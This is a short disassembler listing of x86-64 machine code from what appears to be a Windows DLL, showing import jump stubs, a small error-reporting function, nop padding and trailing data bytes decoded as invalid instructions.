    6968c618:	ff 25 4e 1d 10 00    	jmp    *0x101d4e(%rip)        # 0x6978e36c
    6968c61e:	90                   	nop
    6968c61f:	90                   	nop
    6968c620:	ff 25 2e 1d 10 00    	jmp    *0x101d2e(%rip)        # 0x6978e354
    6968c626:	90                   	nop
    6968c627:	90                   	nop
    6968c628:	ff 25 1e 1d 10 00    	jmp    *0x101d1e(%rip)        # 0x6978e34c
    6968c62e:	90                   	nop
    6968c62f:	90                   	nop
    6968c630:	ff 25 f6 1c 10 00    	jmp    *0x101cf6(%rip)        # 0x6978e32c
    6968c636:	90                   	nop
    6968c637:	90                   	nop
    6968c638:	ff 25 e6 1c 10 00    	jmp    *0x101ce6(%rip)        # 0x6978e324
    6968c63e:	90                   	nop
    6968c63f:	90                   	nop
    6968c640:	ff 25 ce 1c 10 00    	jmp    *0x101cce(%rip)        # 0x6978e314
    6968c646:	90                   	nop
    6968c647:	90                   	nop
    6968c648:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6968c64f:	00 
    6968c650:	56                   	push   %rsi
    6968c651:	53                   	push   %rbx
    6968c652:	48 83 ec 38          	sub    $0x38,%rsp
    6968c656:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
    6968c65b:	48 89 cb             	mov    %rcx,%rbx
    6968c65e:	b9 02 00 00 00       	mov    $0x2,%ecx
    6968c663:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
    6968c668:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
    6968c66d:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
    6968c672:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6968c677:	e8 84 fe ff ff       	call   0x6968c500
    6968c67c:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
    6968c682:	ba 01 00 00 00       	mov    $0x1,%edx
    6968c687:	48 8d 0d b2 92 0e 00 	lea    0xe92b2(%rip),%rcx        # 0x69775940
    6968c68e:	49 89 c1             	mov    %rax,%r9
    6968c691:	e8 aa fc ff ff       	call   0x6968c340
    6968c696:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
    6968c69b:	b9 02 00 00 00       	mov    $0x2,%ecx
    6968c6a0:	e8 5b fe ff ff       	call   0x6968c500
    6968c6a5:	48 89 da             	mov    %rbx,%rdx
    6968c6a8:	48 89 c1             	mov    %rax,%rcx
    6968c6ab:	49 89 f0             	mov    %rsi,%r8
    6968c6ae:	e8 6d fc ff ff       	call   0x6968c320
    6968c6b3:	e8 a8 fc ff ff       	call   0x6968c360
    6968c6b8:	90                   	nop
    6968c6b9:	90                   	nop
    6968c6ba:	90                   	nop
    6968c6bb:	90                   	nop
    6968c6bc:	90                   	nop
    6968c6bd:	90                   	nop
    6968c6be:	90                   	nop
    6968c6bf:	90                   	nop
    6968c6c0:	e9 cb 4c ff ff       	jmp    0x69681390
    6968c6c5:	90                   	nop
    6968c6c6:	90                   	nop
    6968c6c7:	90                   	nop
    6968c6c8:	90                   	nop
    6968c6c9:	90                   	nop
    6968c6ca:	90                   	nop
    6968c6cb:	90                   	nop
    6968c6cc:	90                   	nop
    6968c6cd:	90                   	nop
    6968c6ce:	90                   	nop
    6968c6cf:	90                   	nop
    6968c6d0:	ff                   	(bad)
    6968c6d1:	ff                   	(bad)
    6968c6d2:	ff                   	(bad)
    6968c6d3:	ff                   	(bad)
    6968c6d4:	ff                   	(bad)
    6968c6d5:	ff                   	(bad)
    6968c6d6:	ff                   	(bad)
    6968c6d7:	ff c0                	inc    %eax
    6968c6d9:	c6                   	(bad)
    6968c6da:	68 69 00 00 00       	push   $0x69
	...
    6968c6e7:	00 ff                	add    %bh,%bh
    6968c6e9:	ff                   	(bad)
    6968c6ea:	ff                   	(bad)
    6968c6eb:	ff                   	(bad)
    6968c6ec:	ff                   	(bad)
    6968c6ed:	ff                   	(bad)
    6968c6ee:	ff                   	(bad)
    6968c6ef:	ff 00                	incl   (%rax)
    6968c6f1:	00 00                	add    %al,(%rax)
    6968c6f3:	00 00                	add    %al,(%rax)
    6968c6f5:	00 00                	add    %al,(%rax)
	...
